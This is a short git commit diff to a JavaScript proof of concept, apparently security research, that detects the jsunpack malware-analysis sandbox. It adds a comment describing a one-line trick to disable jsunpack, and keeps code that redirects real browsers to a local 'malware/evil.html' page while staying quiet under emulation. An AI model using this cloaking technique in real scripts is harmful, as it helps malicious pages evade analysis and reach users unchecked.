4387d0b84edb15130025f4873444b3424c395fbc
Krzysztof Kotowicz <kkotowicz@gmail.com>
2010-06-11 10:49:49 +0200

    - added sortest jsunpack disabler

--- js.js
+++ js.js
@@ -1,9 +1,15 @@
 // jsunpack detection
 // @author Krzysztof kotowicz - krzysztof at kotowicz dot net
+
+// the shortest jsunpack disabler
+// put "//[]"  at the beginning of the script
+// (replace [] with HTML tag open/close characters)
+
 fake_browser = false;
+
+// uncomment below for triggering jsunpack detection
 //fake_browser = (window.open.toString().match(/print/));
 if (!fake_browser) {
    window.location = 'http://localhost/~koto/malware/evil.html';
 }
-
 
